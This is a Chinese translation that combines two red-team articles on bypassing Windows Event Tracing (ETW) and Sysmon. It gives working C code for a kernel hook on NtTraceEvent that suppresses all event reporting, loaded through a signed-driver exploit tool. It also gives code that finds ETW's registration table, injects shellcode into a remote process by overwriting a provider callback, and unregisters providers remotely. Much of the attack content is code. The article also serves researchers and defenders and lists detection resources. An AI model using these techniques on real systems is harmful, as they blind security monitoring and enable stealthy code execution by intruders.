
# 两种最新Bypass ETW的方法


                                阅读量   
                                **411966**
                            
                        |
                        
                                                                                                                                    ![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者modexp，文章来源：modexp.wordpress.com
                                <br>原文地址：[https://modexp.wordpress.com/2020/04/08/red-teams-etw/](https://modexp.wordpress.com/2020/04/08/red-teams-etw/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/202797/t0136f85bdc9a7649b7.png)](./img/202797/t0136f85bdc9a7649b7.png)



2020年4月7日，Dylan在其twitter上发布了一种绕过Sysmon和ETW的通用方法，我们对其进行了跟踪研究。4月8日，modexp在其blog上发布了另一种绕过ETW的方法。通过研究，我们发现这2种绕过ETW的方法都很有意思，所以决定对2篇有关绕过ETW的文章进行翻译，并合并为一篇，原汁原味地还原给大家，希望能对想了解ETW的童鞋有所帮助。谢谢~



## 0x01 Dylan：逃避Sysmon和ETW的通用方法

[源代码](https://github.com/bats3c/Ghost-In-The-Logs)和[最新版本](https://github.com/bats3c/Ghost-In-The-Logs/releases/download/1.0/gitl.exe)均可用。

Sysmon和Windows事件日志都是极为强大的防御工具。其灵活的配置使其可以深入了解终端上进行的活动，从而使检测攻击者变得更加容易。出于这个原因，我们将一起探索如何绕过它们的整个旅程。

xpn和matterpreter已对此进行了一些出色的研究。他们的解决方案都不错，但不足以满足我对通用绕过方法的需求。Metterpreter卸载驱动程序的方法在技术上是可行的，但是卸载驱动程序会触发了很多非常明显的事件，这也是令人头疼的问题。

为了弄清楚如何绕过Sysmon和ETW，首先要了解它是如何工作的。<a>@dotslashroot</a>的文章给出了很好的思路。

现在我们知道，ETW（Windows事件跟踪）负责处理内核驱动程序的回调中捕获事件的报告，但是sysmon的用户模式进程是如何报告的呢？

启动Ghidra并运行**sysmon64.exe**，我们可以看到ETW使用Windows API **ReportEventW** 报告事件。

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0180e46e4542fa0c78.jpg)

图1-sysmon64.exe

可以通过hook该调用并过滤或阻止事件……但这有什么意义呢？我们仍然需要Administrator权限才能做到这一点。我们应该可以找到更好的方法来利用它们。

通过深入研究调用链，并在ADVAPI32.dll中查看**ReportEventW** ，我们可以看到，它实质上是**EtwEventWriteTransfer**在NTDLL.dll中定义的包装器。

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a37043194380095f.jpg)

图2-ReportTheEvent

通过检查**EtwEventWriteTransfer**可以看到，它调用了在ntoskrnl.exe内部定义的内核函数**NtTraceEvent**。

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b18a7fb4b4ded5e7.jpg)

图3-NtTracEvent

现在我们知道，任何要报告事件的用户模式进程都将调用此函数。下图是此过程的可视化调用图。

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f403f8c1bec1fd68.jpg)

图4 调用结构图

目前知道了要定位的内核函数，让我们进行测试看其是否能真正起作用。为此，我将使用WinDBG进行内核调试，更多有关信息，请[参见此处](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-kernel-mode-debugging-in-windbg--cdb--or-ntsd)。

在nt!NtTraceEvent设置一个断点，然后在该断点被选中时，我将在函数的起始位置使用 **ret** 进行修补。这将迫使该函数在尚未运行任何事件报告代码之前返回。

它发挥了作用！下图展示了如何启动Powershell而不会触发任何Sysmon的事件提示。

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://blog.dylan.codes/content/images/2020/04/Win10-2020-04-07T13-50-05-953190000Z-1.gif)

图5-效果演示

因此，现在可以开始编写PoC代码了。我们想要编写的代码需要hook **NtTraceEvent**，并让我们选择是否要报告事件。由于我们要定位的函数是内核函数，因此需要让hook代码在内核空间中运行。尝试执行此操作时，我们将遇到两个主要问题。
- [内核驱动程序签名强制](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-)
- [安全内核](https://en.wikipedia.org/wiki/Kernel_Patch_Protection)
幸运的是，已经有超酷的项目可以击败它们，由[InfinityHook](https://github.com/everdox/InfinityHook)制作的[KDU](https://github.com/hfiref0x/KDU)。在这里不会详细介绍它们的工作原理，因为它们各自的链接上有很多信息。

首先编写要在内核中运行的代码，所有链接都可以在[此处](https://github.com/bats3c/Ghost-In-The-Logs/blob/master/Source/InfinityHook/src/kinfinityhook/entry.cpp)找到。在**DriverEntry**开始处，我们需要定位**NtTraceEvent**和**IoCreateDriver**的输出。其次需要找到的**IoCreateDriver**原因是由于**KDU**。它将通过加载和利用一个签名驱动程序来加载我们的驱动程序，然后将其导入内核空间。这种驱动装载方式意味着，将**DriverObject**和**RegistryPath**传递给**DriverEntry**都是不正确的。但是由于我们需要能够与用户模式进程进行通信（由此我们知道何时报告和阻止事件），所以我们需要创建一个有效的**DriverObject**。我们可以通过调用**IoCreateDriver**并给它提供**DriverInitialize**例程的地址来实现这一点，我们的**DriverInitialize**随后将被调用并传递一个有效的**DriverObject**，该对象最终可用于创建IOCTL，允许我们使用用户模式。以下是代码：

```
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS        status;
    UNICODE_STRING  drvName;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[+] infinityhook: Loaded.rn");

    OriginalNtTraceEvent = (NtTraceEvent_t)MmGetSystemRoutineAddress(&amp;StringNtTraceEvent);
    OriginalIoCreateDriver = (IoCreateDriver_t)MmGetSystemRoutineAddress(&amp;StringIoCreateDriver);

    if (!OriginalIoCreateDriver)
    {
        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] infinityhook: Failed to locate export: %wZ.n", StringIoCreateDriver);
        return STATUS_ENTRYPOINT_NOT_FOUND;
    }

    if (!OriginalNtTraceEvent)
    {
        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] infinityhook: Failed to locate export: %wZ.n", StringNtTraceEvent);
        return STATUS_ENTRYPOINT_NOT_FOUND;
    }

    RtlInitUnicodeString(&amp;drvName, L"\Driver\ghostinthelogs");
    status = OriginalIoCreateDriver(&amp;drvName, &amp;DriverInitialize);

    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[+] Called OriginalIoCreateDriver status: 0x%Xn", status);

    NTSTATUS Status = IfhInitialize(SyscallStub);
    if (!NT_SUCCESS(Status))
    {
        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] infinityhook: Failed to initialize with status: 0x%lx.n", Status);
    }

    return Status;
}
```

找到输出并获得有效的**DriverObject**后，我们可以使用**InfinityHook**初始化**NtTraceEvent**的hook函数。**IfhInitialize**函数执行此操作。调用**IfhInitialize**并给它传递指针。每次进行系统调用时都会命中此回调函数。我们给回调函数提供指向将要调用的函数地址的指针。可以访问该指针意味着我们可以将其更改为指向hook函数的地址。回调代码如下所示。

```
void __fastcall SyscallStub(
    _In_ unsigned int SystemCallIndex,
    _Inout_ void** SystemCallFunction)
{
    UNREFERENCED_PARAMETER(SystemCallIndex);

    if (*SystemCallFunction == OriginalNtTraceEvent)
    {
        *SystemCallFunction = DetourNtTraceEvent;
    }
}
```

此代码会将每个NtTraceEvent的调用都重定向到我们的DetourNtTraceEvent。DetourNtTraceEvent的代码如下所示。

```
NTSTATUS DetourNtTraceEvent(
    _In_ PHANDLE TraceHandle,
    _In_ ULONG Flags,
    _In_ ULONG FieldSize,
    _In_ PVOID Fields)
{
    if (HOOK_STATUS == 0)
    {
        return OriginalNtTraceEvent(TraceHandle, Flags, FieldSize, Fields);
    }
    return STATUS_SUCCESS;
}
```

这段代码非常简单。它将检查**HOOK_STATUS**（由用户模式进程通过IOCTL设置）是否为0，如果为0，则它​​将调用执行NtTraceEvent，从而报告事件。如果HOOK_STATUS非零，它将返回**STATUS_SUCCESS** 表明该事件已成功报告，当然这已经是不可能的了。如果有人能弄清楚如何解析**Fields**参数，从而对所报告的事件应用过滤器。

因为我想将所有驱动程序都保留为一个可执行文件，所以我将这个驱动程序嵌入到可执行文件中。当需要使用它时，它将被解压缩，然后KDU将其加载到内核中。

我不会详细介绍其余的代码，因为它主要是KDU和用户模式与驱动程序的交互，但是如果您有兴趣，可以在[这里](https://github.com/bats3c/Ghost-In-The-Logs/tree/master/Source/src)找到。

### <a class="reference-link" name="%E6%95%88%E6%9E%9C%E5%A6%82%E4%BD%95%E5%91%A2%EF%BC%9F"></a>效果如何呢？

在我测试过的所有东西上，如果您发现它无法正常工作，或者有任何一般性的错误，请告诉我，我会尝试修复它们。另外，我不是程序员，所以我的代码将很不完美，您可以在此基础上做出更酷的修改。以下是功能示例：

##### <a class="reference-link" name="%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%B9%B6%E8%AE%BE%E7%BD%AEhook"></a>加载驱动程序并设置hook

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ff18ee84ce361075.jpg)

图片6-设置hook

#### <a class="reference-link" name="%E5%90%AF%E7%94%A8hook%EF%BC%88%E7%A6%81%E7%94%A8%E6%89%80%E6%9C%89%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%EF%BC%89"></a>启用hook（禁用所有日志记录）

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e0435d2299135d48.jpg)

图片7-启用hook

#### <a class="reference-link" name="%E8%8E%B7%E5%8F%96hook%E7%9A%84%E7%8A%B6%E6%80%81"></a>获取hook的状态

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0115236ab1b8058191.jpg)

图片8-获取状态

#### <a class="reference-link" name="%E7%A6%81%E7%94%A8hook%EF%BC%88%E5%90%AF%E7%94%A8%E6%89%80%E6%9C%89%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%EF%BC%89"></a>禁用hook（启用所有日志记录）

[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f6294288435dc5b3.jpg)

图片9-禁用状态



## 0x02 modexp：通过ETW注册项绕过ETW的方法

### <a class="reference-link" name="1.%E7%AE%80%E4%BB%8B"></a>1.简介

这篇blog简要介绍了Red Teams用来破坏Windows事件跟踪工具对恶意活动检测的一些技术。在内存中查找有关提供ETW程序的信息，并使用它来禁用跟踪或执行代码重定向是相对容易的。自2012年以来，[wincheck](http://redplait.blogspot.com/2019/11/last-version-of-wincheck.html)提供了列出[ETW注册信息](http://redplait.blogspot.com/2012/03/etweventregister-on-w8-consumer-preview.html)的选项，所以这里讨论的并不是全新的内容。除了解释ETW的工作原理和目的之外，请在[此处](https://modexp.wordpress.com/2020/04/08/red-teams-etw/#research)参考链接列表。在这篇文章中，我从[Adam Chester](https://twitter.com/_xpn_)的[隐藏您的.NET – ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)中获得了启发，这篇文章中包括了[EtwEventWrite的PoC](https://gist.github.com/xpn/fabc89c6dc52e038592f3fb9d1374673)。还有一个名为[TamperETW](https://gist.github.com/xpn/fabc89c6dc52e038592f3fb9d1374673)的PoC ，作者：Cornelis de Plaa。可以在[此处](https://github.com/odzhan/injection/tree/master/etw)找到与该帖子相关的PoC 。

### <a class="reference-link" name="2.%E6%B3%A8%E5%86%8C%E6%8F%90%E4%BE%9B%E5%95%86"></a>2.注册提供商

在较高级别的进程中，providers使用[advapi32！EventRegister API](https://docs.microsoft.com/en-us/windows/win32/api/evntprov/nf-evntprov-eventregister) 注册，该API通常转发到[ntdll！EtwEventRegister](http://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/evntapi/notificationregister.htm)。该API验证参数并将其转发到[ntdll！EtwNotificationRegister](http://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/evntapi/notificationregister.htm)。调用方会提供唯一的一个，通常用于表示系统上注册provider的GUID、一个可选的回调函数和一个可选的回调上下文。

注册句柄是条目的内存地址与表索引左移48位的组合。之后可以将其与[EventUnregister](https://docs.microsoft.com/en-us/windows/win32/api/evntprov/nf-evntprov-eventunregister)一起使用以禁用跟踪。我们感兴趣的主要功能是负责创建注册条目并将其存储在内存中的功能。ntdll！EtwpAllocateRegistration告诉我们该结构的大小为256个字节。读取和写入条目的函数告诉我们大多数字段的用途，如下：

```
typedef struct _ETW_USER_REG_ENTRY {
    RTL_BALANCED_NODE   RegList;           // List of registration entries
    ULONG64             Padding1;
    GUID                ProviderId;        // GUID to identify Provider
    PETWENABLECALLBACK  Callback;          // Callback function executed in response to NtControlTrace
    PVOID               CallbackContext;   // Optional context
    SRWLOCK             RegLock;           // 
    SRWLOCK             NodeLock;          // 
    HANDLE              Thread;            // Handle of thread for callback
    HANDLE              ReplyHandle;       // Used to communicate with the kernel via NtTraceEvent
    USHORT              RegIndex;          // Index in EtwpRegistrationTable
    USHORT              RegType;           // 14th bit indicates a private
    ULONG64             Unknown[19];
} ETW_USER_REG_ENTRY, *PETW_USER_REG_ENTRY;
```

**ntdll！EtwpInsertRegistration**告诉我们所有入口点的存储位置。对于Windows 10，可以在名为ntdll！EtwpRegistrationTable的全局变量中找到它们。

### <a class="reference-link" name="3.%E6%89%BE%E5%88%B0%E6%B3%A8%E5%86%8C%E8%A1%A8"></a>3.找到注册表

有许多函数引用它，但没有一个是公共函数。
- EtwpRemoveRegistrationFromTable
- EtwpGetNextRegistration
- EtwpFindRegistration
<li>EtwpInsertRegistration<br>
由于我们知道要在内存中查找的结构类型，因此对ntdll.dll中的.data节进行暴力搜索就足以找到它。</li>
```
LPVOID etw_get_table_va(VOID) {
    LPVOID                m, va = NULL;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, cnt;
    PULONG_PTR            ds;
    PRTL_RB_TREE          rbt;
    PETW_USER_REG_ENTRY   re;
    m   = GetModuleHandle(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos-&gt;e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&amp;nt-&gt;OptionalHeader + 
            nt-&gt;FileHeader.SizeOfOptionalHeader);
    //定位 .data 段，保存VA和指针数量
    for(i=0; i&lt;nt-&gt;FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // 对于每一个指针减1
    for(i=0; i&lt;cnt - 1; i++) {
      rbt = (PRTL_RB_TREE)&amp;ds[i];
      // 跳过不是堆内存的指针
      if(!IsHeapPtr(rbt-&gt;Root)) continue;
      // 可能是注册表
      // 检查回调是否为代码
      re = (PETW_USER_REG_ENTRY)rbt-&gt;Root;
      if(!IsCodePtr(re-&gt;Callback)) continue;
      // 保存虚拟地址并退出循环
      va = &amp;ds[i];
      break;
    }
    return va;
}
```

### <a class="reference-link" name="4.%E8%A7%A3%E6%9E%90%E6%B3%A8%E5%86%8C%E8%A1%A8"></a>4.解析注册表

[ETW转储工具](https://github.com/odzhan/injection/tree/master/etw)可以在一个或多个进程的注册表中显示有关每个ETW提供程序的信息。提供程序的名称（私有提供程序除外）使用[ITraceDataProvider :: get_DisplayName](https://docs.microsoft.com/en-us/windows/win32/api/pla/nn-pla-itracedataprovider)获得。此方法使用 [Trace Data Helper API](https://docs.microsoft.com/en-us/windows/win32/etw/retrieving-event-data-using-tdh)，实际上API内部是通过WMI查询实现的。

```
Node        : 00000267F0961D00
GUID        : {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4} (.NET Common Language Runtime)
Description : Microsoft .NET Runtime Common Language Runtime - WorkStation
Callback    : 00007FFC7AB4B5D0 : clr.dll!McGenControlCallbackV2
Context     : 00007FFC7B0B3130 : clr.dll!MICROSOFT_WINDOWS_DOTNETRUNTIME_PROVIDER_Context
Index       : 108
Reg Handle  : 006C0267F0961D00
```

### <a class="reference-link" name="5.%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91"></a>5.代码重定向

提供程序的回调函数由内核在请求中调用，以启用或禁用跟踪。对于CLR，相关函数是**clr！McGenControlCallbackV2**。代码重定向是通过简单地用新回调的地址替换回调地址来实现的。当然，它必须使用相同的原型，否则一旦回调完成执行，主机进程将崩溃。我们可以使用[StartTrace](https://docs.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-starttracea)和[EnableTraceEx API](https://docs.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-enabletraceex) 调用新的回调，并且结合[NtTraceControl](http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/etw/traceapi/control/index.htm)可能有更简单的方法。

```
//使用ETW注册入口点

BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
    RTL_RB_TREE             tree;
    PVOID                   etw, pdata, cs, callback;
    HANDLE                  hp;
    SIZE_T                  rd, wr;
    ETW_USER_REG_ENTRY      re;
    PRTL_BALANCED_NODE      node;
    OLECHAR                 id[40];
    TRACEHANDLE             ht;
    DWORD                   plen, bufferSize;
    PWCHAR                  name;
    PEVENT_TRACE_PROPERTIES prop;
    BOOL                    status = FALSE;
    const wchar_t           etwname[]=L"etw_injection";

    if(path == NULL) return FALSE;
    // 尝试将shellcode读入内存
    plen = readpic(path, &amp;pdata);
    if(plen == 0) { 
      wprintf(L"ERROR: Unable to read shellcode from %sn", path);
      return FALSE;
    }
    // 尝试获取ETW注册表的VA
    etw = etw_get_table_va();
    if(etw == NULL) {
      wprintf(L"ERROR: Unable to obtain address of ETW Registration Table.n");
      return FALSE;
    }
    printf("*********************************************n");
    printf("EtwpRegistrationTable for %i found at %pn", pid, etw);
    //尝试打开目标进程
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) {
      xstrerror(L"OpenProcess(%ld)", pid);
      return FALSE;
    }
    // 除非指定，否则使用（Microsoft Windows用户诊断）
    node = etw_get_reg(
      hp,
      etw,
      prov != NULL ? prov : L"{305FC87B-002A-5E26-D297-60223012CA9C}",&amp;re);

    if(node != NULL) {
      // 将GUID转换为字符串和显示名称
      StringFromGUID2(&amp;re.ProviderId, id, sizeof(id));
      name = etw_id2name(id);

      wprintf(L"Address of remote node  : %pn", (PVOID)node);
      wprintf(L"Using %s (%s)n", id, name);

      // 为shellcode 分配内存
      cs = VirtualAllocEx(
        hp, NULL, plen, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);

      if(cs != NULL) {
        wprintf(L"Address of old callback : %pn", re.Callback);
        wprintf(L"Address of new callback : %pn", cs);

        // 写shellcode
        WriteProcessMemory(hp, cs, pdata, plen, &amp;wr);

        // 初始化追踪
        bufferSize = sizeof(EVENT_TRACE_PROPERTIES) +
                     sizeof(etwname) + 2;

        prop = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);
        prop-&gt;Wnode.BufferSize    = bufferSize;
        prop-&gt;Wnode.ClientContext = 2;
        prop-&gt;Wnode.Flags         = WNODE_FLAG_TRACED_GUID;
        prop-&gt;LogFileMode         = EVENT_TRACE_REAL_TIME_MODE;
        prop-&gt;LogFileNameOffset   = 0;
        prop-&gt;LoggerNameOffset    = sizeof(EVENT_TRACE_PROPERTIES);

        if(StartTrace(&amp;ht, etwname, prop) == ERROR_SUCCESS) {
          //保存回调
          callback = re.Callback;
          re.Callback = cs;

          // 用shellcode地址覆盖现有入口点
          WriteProcessMemory(hp, 
            (PBYTE)node + offsetof(ETW_USER_REG_ENTRY, Callback),
            &amp;cs, sizeof(ULONG_PTR), &amp;wr);

          //通过启用跟踪触发shellcode的执行
          if(EnableTraceEx(
            &amp;re.ProviderId, NULL, ht,
            1, TRACE_LEVEL_VERBOSE,
            (1 &lt;&lt; 16), 0, 0, NULL) == ERROR_SUCCESS)
          {
            status = TRUE;
          }

          // 还原回调
          WriteProcessMemory(hp, 
            (PBYTE)node + offsetof(ETW_USER_REG_ENTRY, Callback),
            &amp;callback, sizeof(ULONG_PTR), &amp;wr);

          // 禁用tracing
          ControlTrace(ht, etwname, prop, EVENT_TRACE_CONTROL_STOP);
        } else {
          xstrerror(L"StartTrace");
        }
        LocalFree(prop);
        VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
      }
    } else {
      wprintf(L"ERROR: Unable to get registration entry.n");
    }
    CloseHandle(hp);
    return status;
}
```

### <a class="reference-link" name="6.%E7%A6%81%E7%94%A8%E8%B7%9F%E8%B8%AA"></a>6.禁用跟踪

如果更详细地检查**clr！McGenControlCallbackV2**，我们将发现它会更改回调上下文中的值以启用或禁用事件跟踪。对于CLR，使用以下结构和功能。同样，对于不同版本的CLR，可以对此进行不同的定义。

```
typedef struct _MCGEN_TRACE_CONTEXT {
    TRACEHANDLE      RegistrationHandle;
    TRACEHANDLE      Logger;
    ULONGLONG        MatchAnyKeyword;
    ULONGLONG        MatchAllKeyword;
    ULONG            Flags;
    ULONG            IsEnabled;
    UCHAR            Level;
    UCHAR            Reserve;
    USHORT           EnableBitsCount;
    PULONG           EnableBitMask;
    const ULONGLONG* EnableKeyWords;
    const UCHAR*     EnableLevel;
} MCGEN_TRACE_CONTEXT, *PMCGEN_TRACE_CONTEXT;

void McGenControlCallbackV2(
  LPCGUID              SourceId, 
  ULONG                IsEnabled, 
  UCHAR                Level, 
  ULONGLONG            MatchAnyKeyword, 
  ULONGLONG            MatchAllKeyword, 
  PVOID                FilterData, 
  PMCGEN_TRACE_CONTEXT CallbackContext) 
{
  int cnt;

  // 如果有上下文
  if(CallbackContext) {
    // 并且control code不为零
    if(IsEnabled) {
      // 启用追踪
      if(IsEnabled == EVENT_CONTROL_CODE_ENABLE_PROVIDER) {
        // 设置上下文
        CallbackContext-&gt;MatchAnyKeyword = MatchAnyKeyword;
        CallbackContext-&gt;MatchAllKeyword = MatchAllKeyword;
        CallbackContext-&gt;Level           = Level;
        CallbackContext-&gt;IsEnabled       = 1;

        // ...其他代码省略...
      }
    } else {
      // 禁用追踪
      CallbackContext-&gt;IsEnabled       = 0;
      CallbackContext-&gt;Level           = 0;
      CallbackContext-&gt;MatchAnyKeyword = 0;
      CallbackContext-&gt;MatchAllKeyword = 0;

      if(CallbackContext-&gt;EnableBitsCount &gt; 0) {

        ZeroMemory(CallbackContext-&gt;EnableBitMask,
          4 * ((CallbackContext-&gt;EnableBitsCount - 1) / 32 + 1));
      }
    }
    EtwCallback(
      SourceId, IsEnabled, Level, 
      MatchAnyKeyword, MatchAllKeyword, 
      FilterData, CallbackContext);
  }
}
```

有许多选项可以禁用CLR日志记录，而无需修补代码。
- 使用[EVENT_CONTROL_CODE_DISABLE_PROVIDER](https://docs.microsoft.com/en-us/windows/win32/api/evntprov/nc-evntprov-penablecallback)调用McGenControlCallbackV2。
- 直接修改MCGEN_TRACE_CONTEXT和ETW注册结构以防止进一步记录。
<li>调用EventUnregister传递注册句柄。<br>
最简单的方法是将注册句柄传递给ntdll！EtwEventUnregister。以下只是一个PoC。<br>[![](./img/202797/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b813d9b1cba4c6f2.png)
</li>
```
BOOL etw_disable(
    HANDLE             hp,
    PRTL_BALANCED_NODE node,
    USHORT             index) 
{
    HMODULE               m;
    HANDLE                ht;
    RtlCreateUserThread_t pRtlCreateUserThread;
    CLIENT_ID             cid;
    NTSTATUS              nt=~0UL;
    REGHANDLE             RegHandle;
    EventUnregister_t     pEtwEventUnregister;
    ULONG                 Result;

    // 获得创建新线程的API地址
    m = GetModuleHandle(L"ntdll.dll");
    pRtlCreateUserThread = (RtlCreateUserThread_t)
    GetProcAddress(m, "RtlCreateUserThread");

    // 创建注册句柄
    RegHandle           = (REGHANDLE)((ULONG64)node | (ULONG64)index &lt;&lt; 48);
    pEtwEventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");

    // 在远程进程中执行payload
    printf("  [ Executing EventUnregister in remote process.n");
    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL,
      NULL, pEtwEventUnregister, (PVOID)RegHandle, &amp;ht, &amp;cid);

    printf("  [ NTSTATUS is %lxn", nt);
    WaitForSingleObject(ht, INFINITE);

    // EtwEventUnregister的读取结果
    GetExitCodeThread(ht, &amp;Result);
    CloseHandle(ht);

    SetLastError(Result);

    if(Result != ERROR_SUCCESS) {
      xstrerror(L"etw_disable");
      return FALSE;
    }
    disabled_cnt++;
    return TRUE;
}
```



## 0x03 更多研究和资料

下面是更多有关ETW的文章和工具。感兴趣的童鞋可以进一步阅读，点击链接即可。
<li>
[篡改Windows事件跟踪：背景，攻击和防御](https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63)，作者[Matt Graeber](https://twitter.com/mattifestation)
</li>
<li>
[ModuleMonitor](https://github.com/TheWover/ModuleMonitor),作者[TheWover](https://twitter.com/TheRealWover)
</li>
<li>
[FuzzySec](https://twitter.com/FuzzySec)的[SilkETW](https://github.com/fireeye/SilkETW)
</li>
<li>
[ETW浏览器](https://github.com/zodiacon/EtwExplorer),作者[Pavel Yosifovich](https://twitter.com/PetrBenes)
</li>
<li>
[EtwConsumerNT](https://github.com/wbenny/EtwConsumerNT)，作者[Petr Benes](https://twitter.com/PetrBenes)
</li>
- Endgame的[ClrGuard](https://github.com/endgameinc/ClrGuard)。
- [检测使用.NET的恶意软件—第1部分](https://blog.f-secure.com/detecting-malicious-use-of-net-part-1/)
- [检测使用.NET的恶意软件—第2部分](https://blog.f-secure.com/detecting-malicious-use-of-net-part-2/)
- [寻找内存中的.NET攻击](https://www.elastic.co/blog/hunting-memory-net-attacks)
- [使用ETW检测.NET开发的无文件C2Agent的恶意行为](https://work.delaat.net/rp/2019-2020/p56/report.pdf)
- [让ETW变得更强大](https://ruxcon.org.au/assets/2016/slides/ETW_16_RUXCON_NJR_no_notes.pdf)
- [从远程进程中枚举AppDomain](https://lowleveldesign.org/2016/08/23/enumerating-appdomains-in-a-remote-process/)
<li>
[ETW日志记录](http://redplait.blogspot.com/2017/09/etw-private-loggers.html)，[EtwEventRegister上W8消费者预览](http://redplait.blogspot.com/2012/03/etweventregister-on-w8-consumer-preview.html)， [EtwEventRegister](http://redplait.blogspot.com/2011/02/etweventregister.html)，作者[redplait](https://twitter.com/real_redp)
</li>
- [禁用用户模式下的ETW记录器](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)
- [禁用当前PowerShell会话中ETW](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)